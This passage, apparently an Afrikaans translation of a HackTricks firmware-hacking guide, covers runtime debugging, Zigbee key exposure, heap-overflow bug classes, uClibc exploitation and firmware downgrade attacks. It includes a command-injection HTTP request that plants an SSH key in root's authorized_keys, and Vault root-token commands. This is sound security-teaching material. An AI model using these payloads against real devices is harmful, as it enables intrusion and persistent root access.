Op hierdie stadium word ’n werklike of geëmuleerde toestelomgewing vir analise gebruik. Dit is noodsaaklik om shell-toegang tot die bedryfstelsel en lêerstelsel te behou. Emulasie boots hardeware-interaksies dalk nie perfek na nie, wat dit soms nodig maak om die emulasie te herbegin. Die analise behoort die lêerstelsel weer te ondersoek, blootgestelde webblaaie en netwerkdienste te exploit, en selflaaiprogramkwesbaarhede te verken. Firmware-integriteitstoetse is noodsaaklik om moontlike backdoor-kwesbaarhede te identifiseer.

## Looptyd-analise-tegnieke

Looptyd-analise behels interaksie met ’n proses of binêre lêer in sy bedryfsomgewing, met nutsprogramme soos gdb-multiarch, Frida en Ghidra om breekpunte te stel en kwesbaarhede deur fuzzing en ander tegnieke te identifiseer.

Vir ingebedde teikens sonder ’n volledige debugger, **kopieer ’n staties gekoppelde `gdbserver`** na die toestel en koppel op afstand daaraan:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / kartering van radio-medeverwerkerboodskappe

Op IoT-hubs word die RF-stack dikwels tussen ’n **radio-MCU** en ’n Linux-userland-proses verdeel. ’n Nuttige werkvloei is om die pad te karteer:<sup>[[8]](#references)</sup>

1. **RF-raam** oor die lug
2. **Ontleder aan die beheerderkant** op die radio-MCU
3. **Seriële/UART-teks- of TLV-protokol** wat na Linux aangestuur word (byvoorbeeld `/dev/tty*`)
4. **Toepassingsdispatcher** in die hoofdemon
5. **Protokolspesifieke hanteerder / toestandsmasjien**

Hierdie argitektuur skep twee teikens vir reverse engineering in plaas van een. As die beheerder binêre radiogrense in ’n teksprotokol soos `Group,Command,arg1,arg2,...` omskakel, spoor die volgende op:

- Die **boodskapgroepe** en dispatch-tabelle
- Watter boodskappe van die **netwerk** kan kom teenoor dié wat van die beheerder self kom
- Die presiese **vervaardigerspesifieke onderskeidingsvelde** (byvoorbeeld Zigbee `manufacturer_code` en pasgemaakte `cluster_command`)
- Watter hanteerders slegs bereikbaar is tydens **commissioning**, ontdekking of aflaaifases van firmware/modelle

Neem spesifiek vir Zigbee paringsverkeer op en kyk of die teiken steeds die verstek-**Link Key** `ZigBeeAlliance09` gebruik. Indien wel, kan die afluistering van commissioning-verkeer die **Network Key** blootlê. Zigbee 3.0-install codes verminder hierdie blootstelling; let dus op of die getoetste toestel dit werklik afdwing.

### Vervaardigerspesifieke protok hanteerders en FSM-beheerde bereikbaarheid

Vervaardigerspesifieke Zigbee/ZCL-opdragte is dikwels ’n beter teiken as gestandaardiseerde clusters, omdat hulle **pasgemaakte ontledingskode** en interne **FSM’e** voed met minder beproefde validasie.<sup>[[8]](#references)</sup>

Praktiese werkvloei:

- Reverse engineer die opdragdispatcher totdat jy die **hanteerder wat net vir die vervaardiger bedoel is** vind.
- Bepaal die tabelle vir **FSM-toestand**, **gebeurtenis**, **kontrole**, **aksie** en **volgende toestand**.
- Identifiseer **oorgangstoestande** wat outomaties voortgaan, asook herprobeer-/foutvertakkings wat uiteindelik aanvallerbeheerde toestand terugstel of vrystel.
- Bevestig watter wettige protokoluitruilings nodig is om die demoon in die kwesbare toestand te plaas, eerder as om aan te neem dat die foutiewe hanteerder altyd bereikbaar is.

Vir tydsensitiewe protokolle kan pakketherhaling vanuit ’n Python-raamwerk te stadig wees. ’n Betroubaarder benadering is om ’n wettige toestel op werklike hardeware (byvoorbeeld ’n **nRF52840**) met ’n vervaardigervlak-stack na te boots, sodat jy die korrekte **eindpunte**, **eienskappe** en commissioning-tydsberekening kan blootlê.

### Foutklas vir gefragmenteerde aflaaie in ingebedde demone

’n Herhalende firmware-foutklas kom voor in **aflaaie van gefragmenteerde blobs/modelle/konfigurasies**:<sup>[[8]](#references)</sup>

1. Die **eerste fragment** (`offset == 0`) stoor `ctx->total_size` en ken `malloc(total_size)` toe.
2. Latere fragmente valideer slegs die aanvallerbeheerde **pakkie-plaaslike** velde, soos `packet_total_size >= offset + chunk_len`.
3. Die kopie gebruik `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sonder om teen die **oorspronklike toegekende grootte** te kontroleer.

Hierdeur kan ’n aanvaller die volgende stuur:

- ’n Eerste geldige fragment met ’n **klein** verklaarde totale grootte om ’n klein heap-toekenning af te dwing.
- ’n Latere fragment met die **verwagte offset**, maar ’n groter `chunk_len`.
- ’n Vervalste pakkie-plaaslike grootte wat aan die nuwe kontroles voldoen, maar steeds die oorspronklik toegekende buffer oorloop.

Wanneer die kwesbare pad agter commissioning-logika sit, moet die uitbuiting genoeg **toestelnabootsing** insluit om die teiken in die verwagte modelaflaai- of blobaflaaitoestand te plaas voordat die misvormde fragmente gestuur word.

### Protokolgedrewe `free()`-snellers

In ingebedde demone is die maklikste manier om heap-metadata-uitbuiting te aktiveer dikwels nie om “vir opruiming te wag” nie, maar om **die protokol se eie foutafhandeling af te dwing**:<sup>[[8]](#references)</sup>

- Stuur misvormde opvolgfragmente om die FSM na **herprobeer-** of **fouttoestande** te stuur.
- Oorskry die herprobeerdrempel sodat die demoon die **konteks terugstel** en die korrupte buffer vrystel.
- Gebruik hierdie voorspelbare `free()` om primitiewe aan die allokeerderkant te aktiveer voordat die proses om onverwante redes ineenstort.

Dit is veral nuttig teen **musl/uClibc/dlmalloc-agtige** allokeerders in ingebedde Linux, waar korrupsie van chunk-metadata unlink/unbin-logika in ’n skryfprimitief kan omskep. ’n Stabiele patroon is om ’n **grootteveld** te korrupteer om die allokeerder se deursoeking na **vals chunks wat binne die oorlooppende buffer geplaas is** te herlei, eerder as om werklike bin-wysers onmiddellik te beskadig en die proses te laat ineenstort.

## Binary Exploitation en Proof-of-Concept

Die ontwikkeling van ’n PoC vir geïdentifiseerde kwesbaarhede vereis ’n diep begrip van die teikenargitektuur en programmering in laervlaktale. Binêre looptydbeskermings is skaars in ingebedde stelsels, maar wanneer hulle teenwoordig is, kan tegnieke soos Return Oriented Programming (ROP) nodig wees.

### uClibc fastbin-uitbuitingsaantekeninge (ingebedde Linux)

- **Fastbins + konsolidasie:** uClibc gebruik fastbins soortgelyk aan glibc. ’n Latere groot toekenning kan `__malloc_consolidate()` aktiveer, dus moet enige vals chunk die kontroles slaag (redelike grootte, `fd = 0`, en omliggende chunks wat as “in gebruik” beskou word).<sup>[[6]](#references)</sup>
- **Nie-PIE-binaries onder ASLR:** indien ASLR geaktiveer is, maar die hoofbinêre lêer **nie-PIE** is, is adresse in `.data/.bss` binne die binêre lêer stabiel. Jy kan ’n streek teiken wat reeds soos ’n geldige heap-chunk-kopstuk lyk, om ’n fastbin-toekenning op ’n **funksiewysertabel** te laat beland.
- **NUL wat ontleding stop:** wanneer JSON ontleed word, kan ’n `\x00` in die loonvrag die ontleding stop terwyl aanvallerbeheerde agterste grepe behoue bly vir ’n stack pivot/ROP-ketting.
- **Shellcode via `/proc/self/mem`:** ’n ROP-ketting wat `open("/proc/self/mem")`, `lseek()` en `write()` aanroep, kan uitvoerbare shellcode in ’n bekende geheuekartering plaas en daarna daarheen spring.

## Voorbereide bedryfstelsels vir firmware-analise

Bedryfstelsels soos [AttifyOS](https://github.com/adi0x90/attifyos) en [EmbedOS](https://github.com/scriptingxss/EmbedOS) bied vooraf gekonfigureerde omgewings vir firmware-sekuriteitstoetsing, toegerus met die nodige gereedskap.

## Voorbereide OS’e om firmware te analiseer

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is ’n distro wat bedoel is om jou te help met sekuriteitsevaluering en penetrasietoetsing van Internet of Things (IoT)-toestelle. Dit bespaar jou baie tyd deur ’n vooraf gekonfigureerde omgewing met al die nodige gereedskap te verskaf.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): ’n Bedryfstelsel vir ingebedde sekuriteitstoetsing, gebaseer op Ubuntu 18.04 en vooraf gelaai met firmware-sekuriteitstoetsingsgereedskap.

## Firmware-downgrade-aanvalle en onveilige opdateringsmeganismes

Selfs wanneer ’n vervaardiger kriptografiese handtekeningkontroles vir firmwarebeelde implementeer, word **beskerming teen weergawe-terugrol (downgrade)** dikwels weggelaat. Wanneer die selflaai- of herstel-laaier slegs die handtekening met ’n ingebedde publieke sleutel verifieer, maar nie die *weergawe* (of ’n monotone teller) van die beeld wat geflits word vergelyk nie, kan ’n aanvaller wettiglik **ouer, kwesbare firmware met ’n geldige handtekening installeer** en sodoende gelapte kwesbaarhede weer invoer.<sup>[[4]](#references)</sup>

Tipiese aanvalswerkvloei:

1. **Kry ’n ouer, ondertekende beeld**
   * Kry dit by die vervaardiger se openbare aflaaiblad, CDN of ondersteuningswerf.
   * Onttrek dit uit gepaardgaande mobiele-/rekenaartoepassings (bv. binne ’n Android APK onder `assets/firmware/`).
   * Kry dit van derdeparty-bewaarplekke soos VirusTotal, internetargiewe, forums, ens.
2. **Laai die beeld op na of bedien dit aan die toestel** via enige blootgestelde opdateringskanaal:
   * Web-UI, mobieletoepassing-API, USB, TFTP, MQTT, ens.
   * Baie verbruikers-IoT-toestelle stel *ongeverifieerde* HTTP(S)-eindpunte bloot wat Base64-geënkodeerde firmwareblobs aanvaar, dit aan die bedienerkant dekodeer en herstel/opgradering aktiveer.
3. Nadat die downgrade uitgevoer is, buit ’n kwesbaarheid uit wat in die nuwer weergawe gelap is (byvoorbeeld ’n opdrag-inspuitfilter wat later bygevoeg is).
4. Flits opsioneel die nuutste beeld terug of deaktiveer opdaterings om opsporing te vermy sodra volharding verkry is.

### Voorbeeld: Opdrag-inspuiting ná ’n downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

In die kwesbare (afgegradeerde) firmware word die `md5`-parameter direk in ’n shell-opdrag saamgevoeg sonder ontsmetting, wat injection van arbitrêre opdragte moontlik maak (hier: om root-toegang op grond van SSH-sleutels te aktiveer). Latere firmwareweergawes het ’n basiese karakterfilter bygevoeg, maar omdat daar geen beskerming teen afgradering is nie, is die regstelling nutteloos.<sup>[[4]](#references)</sup>

### Onttrekking van firmware uit mobiele toepassings

Baie verskaffers sluit volledige firmwarebeelde in hul metgesel-mobiele toepassings in, sodat die toepassing die toestel via Bluetooth/Wi-Fi kan opdateer. Hierdie pakkette word gewoonlik ongeënkripteer in die APK/APEX gestoor, onder paaie soos `assets/fw/` of `res/raw/`. Met nutsmiddels soos `apktool`, `ghidra` of selfs gewone `unzip` kan jy ondertekende beelde onttrek sonder om aan die fisiese hardeware te raak.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Anti-rollback-omseiling slegs in die updater in A/B-slotontwerpe

Sommige vendors implementeer wel ’n anti-downgrade-**ratchet**, maar slegs binne die *updater*-logika (byvoorbeeld ’n UDS-roetine oor CAN, ’n recovery-opdrag of ’n userspace OTA-agent). As die **bootloader** later net die image se signature/CRC nagaan en die partisietabel of slotmetadata vertrou, kan rollback-beskerming steeds omseil word.<sup>[[7]](#references)</sup>

Tipiese swak ontwerp:

- Firmware-metadata bevat sowel ’n weergawebeskrywing as ’n **security ratchet** / monotone teller.
- Die updater vergelyk die image se ratchet met ’n waarde wat in persistente berging gestoor is en verwerp ouer getekende images.
- Die bootloader **ontleed nie** daardie ratchet nie en verifieer net die header, CRC en signature voordat dit die gekose slot selflaai.
- Slotaktivering word afsonderlik in ’n partisietabel of per-slot-generasieteller gestoor en is **nie kriptografies gekoppel** aan die presiese firmware-digest wat gevalideer is nie.

Dit skep ’n **valideer-een-image / selflaai-’n-ander-image**-primitive in dubbelstelsel-slotstelsels. As die aanvaller die updater kan laat merk dat slot B die volgende selflaaiteiken is deur ’n huidige getekende image te gebruik, en slot B later voor die herlaai kan oorskryf, kan die bootloader steeds die afgegradeerde image selflaai omdat dit net die reeds vasgelegde slotmetadata vertrou.

Algemene misbruikpatroon:

1. Laai ’n **huidige getekende** firmware na die passiewe slot op en voer die normale validasie-/skakelroetine uit sodat die uitleg daardie slot as die volgende aktiewe slot merk.
2. **Moenie nog herlaai nie**. Voer die gleufvoorbereidings-/uitveeroetine weer in dieselfde sessie uit.
3. Misbruik verouderde selflaaitoestand- of gleufkeuselogika sodat die updater **dieselfde fisiese slot** uitvee wat pas bevorder is.
4. Skryf ’n **ouer maar steeds getekende** firmware na daardie slot.
5. Slaan die validasieroetine wat die ratchet afdwing oor en herlaai direk.
6. Die bootloader kies die bevorderde slot, verifieer net die signature/integriteit en selflaai die ou image.

Dinge waarna jy moet soek wanneer jy A/B-opdateringsimplementasies reverse-engineer:

- Gleufkeuse wat afgelei word van **selflaaitydvlae** wat nie ná ’n suksesvolle skakeling verfris word nie.
- ’n Roetine in die styl van `prepare_passive_slot()` wat ’n slot uitvee op grond van verouderde toestand eerder as die **huidige vasgelegde uitleg**.
- ’n Funksie in die styl van `part_write_layout()` wat net ’n **generasieteller** / aktiewe vlag verhoog en nie die gevalideerde image-hash stoor nie.
- Ratchet-kontroles wat in userspace- of updater-kode geïmplementeer is, maar **nie** in ROM / bootloader / secure-boot-stadiums nie.
- Uitvee- of recovery-roetines wat die slot as selflaaibaar gemerk laat, selfs nadat die inhoud daarvan verwyder en oorgeskryf is.

### Kontrolelys vir die beoordeling van opdateringslogika

* Is die transport/verifikasie van die *update endpoint* voldoende beskerm (TLS + verifikasie)?
* Vergelyk die toestel **weergawenommers** of ’n **monotone anti-rollback-teller** voordat dit flits?
* Word die image binne ’n secure-boot-ketting geverifieer (bv. word signatures deur ROM-kode nagegaan)?
* Dwing die **bootloader dieselfde ratchet af** as die updater, eerder as om net signature/CRC na te gaan?
* Is slotaktiveringsmetadata **gekoppel aan die gevalideerde firmware-digest/weergawe**, of kan ’n slot ná bevordering verander word?
* Word die toestel gedwing om te herlaai nadat ’n slotskakeling slaag, of is latere opdaterings-/uitveerroetines steeds in dieselfde sessie bereikbaar?
* Voer userland-kode bykomende gesonde-verstand-kontroles uit (bv. toegelate partisietoewysing, modelnommer)?
* Hergebruik *gedeeltelike* of *rugsteun*-opdateringsvloeie dieselfde valideringslogika?

> 💡  As enige van die bogenoemde ontbreek, is die platform waarskynlik kwesbaar vir rollback-aanvalle.

## Kwesbare firmware om mee te oefen

Om te oefen om kwesbaarhede in firmware te ontdek, gebruik die volgende kwesbare firmwareprojekte as ’n beginpunt.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Herwinning van firmware-dekripsiesleutels uit ingebedde KMS/Vault-toestand

Wanneer ’n opdateringsimage klein plaintext-metadata met ’n groot blob met hoë entropie kombineer, doen eers houertriage voordat jy enigiets brute-force:<sup>[[1]](#references)</sup>

- Stort headers, offsets en reëlgrense met `hexdump`, `xxd`, `strings -tx`, `base64 -d` en `binwalk -E`.
- `Salted__` beteken gewoonlik OpenSSL `enc`-formaat: die volgende 8 grepe is die salt en die oorblywende grepe is ciphertext.
- ’n Base64-veld wat na presies `256` grepe dekodeer, is ’n sterk aanduiding dat jy na ’n RSA-2048-ciphertext kyk wat ’n ewekansige firmwarewagwoord/sessiesleutel omvou.
- Afsonderlike PGP-materiaal in dieselfde lêer beskerm dikwels net egtheid; moenie aanvaar dat dit die vertroulikheidsmeganisme is nie.

As statiese sleuteljag (`grep`, `strings`, PEM/PGP-soektogte) misluk, reverse-engineer eerder die **operasionele dekripsiepad** as om net na private sleutels te soek:

- Decompile die updater-/bestuursbinêre lêer en spoor na wie die geënkripteerde blob lees, watter helper/API dit ontseël en watter logiese sleutelnaam dit aanvra.
- Soek in die onttrekte root-lêerstelsel na KMS-toestand (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), asook unit-lêers en init-skripte.
- Behandel plaintext `vault operator unseal ...`, recovery-sleutels, bootstrap-tokens of plaaslike KMS-auto-unseal-skripte as gelykstaande aan private-sleutelmateriaal.

As die toestel die oorspronklike Vault-binêre lêer en bergingbackend insluit, is dit gewoonlik makliker om daardie omgewing te herspeel as om Vault se interne werking te herimplementeer:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Met root op die gekloonde KMS:

- Maak transit keys slegs binne die geïsoleerde kloon uitvoerbaar: `vault write transit/keys/<name>/config exportable=true`
- Voer die unwrap key uit: `vault read transit/export/encryption-key/<name>`
- Toets die herwonne RSA-sleutel met die presiese padding/hash-paar wat die KMS gebruik. ’n Mislukte PKCS#1 v1.5-dekriptering en ’n mislukte verstek-OAEP-dekriptering bewys **nie** dat die sleutel verkeerd is nie; baie Vault-ondersteunde vloeie gebruik OAEP met SHA-256, terwyl algemene biblioteke by verstek SHA-1 gebruik.
- As die payload met `Salted__` begin, herhaal die verskaffer se OpenSSL KDF presies (`EVP_BytesToKey`, dikwels MD5 op ouer toestelle) voordat jy AES-CBC-dekripsie probeer.

Dit verander “geënkripteerde firmware” in ’n meer algemene probleem: **herwin die operasionele sleutels aan die toestel se kant, en reproduseer dan die presiese unwrap- en KDF-parameters vanlyn**.

## Opleiding en sertifisering

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Firmware kraak met Claude: Vaardigheid op seniorvlak, outonomie op juniorvlak](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologie vir firmware-sekuriteitstoetsing](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktiese IoT-inbraak: Die definitiewe gids tot aanvalle op die Internet van Dinge](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Zero-days in verlate hardeware uitbuit – Trail of Bits-blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Hoe ’n slimtoestel van $20 my toegang tot jou huis gegee het](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Nou sien jy mi: Nou is jy gepwn](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Die Tesla Wall Connector uitbuit vanaf sy laaipoortverbinding - Deel 2: die anti-afgradering-omseiling](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Laat dit flikker: Oor-die-lug-uitbuiting van die Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS op QEMU Deel 1: Uitpak](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux-kern-dokumentasie - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS op QEMU Deel 2: Ontfouting en regstelling](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS-wagwoorde: Swak XOR-enkripsie maak herstel vanaf SPI Flash moontlik (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Nutsgoed vir Dell BIOS-wagwoordherstel](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
